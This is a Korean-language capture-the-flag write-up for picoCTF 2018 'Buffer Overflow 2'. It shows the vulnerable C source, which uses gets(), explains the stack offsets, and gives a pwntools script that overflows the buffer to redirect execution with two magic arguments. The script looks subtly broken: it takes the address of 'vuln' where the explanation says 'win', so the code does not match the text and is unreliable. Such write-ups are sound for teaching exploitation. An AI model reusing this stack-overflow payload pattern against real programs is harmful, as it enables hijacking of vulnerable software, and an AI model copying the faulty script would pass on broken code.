# picoCTF 2018

<h5> Buffer OverFlow 2 </h5>
<hr>

<h5> Solution </h5>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

<p> 이전의 bof1 문제를 풀 때와 동일한 방식으로 풀이하는 문제이다. <br>
그렇지만 win 함수로 넘겨줬을때 arg1, arg2 에 각각 0xDEADBEEF, 0xDEADC0DE 값이 있는지 조건문 검사를 하게 된다. </p>

<p> 바이너리에서 요구하는 조건문을 맞춰주면서 페이로드를 구성하면 된다. </p>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fk.kakaocdn.net%2Fdn%2Fssm8s%2FbtqxRvBHylk%2FoNU4MMw2v40Lc1umfglGzk%2Fimg.png"><br>

<p> 메모리에 우리가 입력하는 값은 lea, eax[ebp-0x6c] 공간에 위치한다. </p>
<p> 0x6c = 108Byte + SFP(4) + RET(win) 으로 페이로드를 맞춰주고, <br>
조건문에서 요구하는 arg1, arg2 주소를 써주면 된다. </p>

```py
#!/usr/bin/python

from pwn import *

p = process('./vuln')
e = ELF('./vuln')

context.log_level = 'debug'

win = e.symbols['vuln']

code1 = 0xDEADBEEF
code2= 0XDEADC0DE

payload = "A"*112

payload += p32(win)

payload += "A"*4

payload += p32(code1)

payload += p32(code2)

p.sendline(payload)

print p.recv()

p.close()
```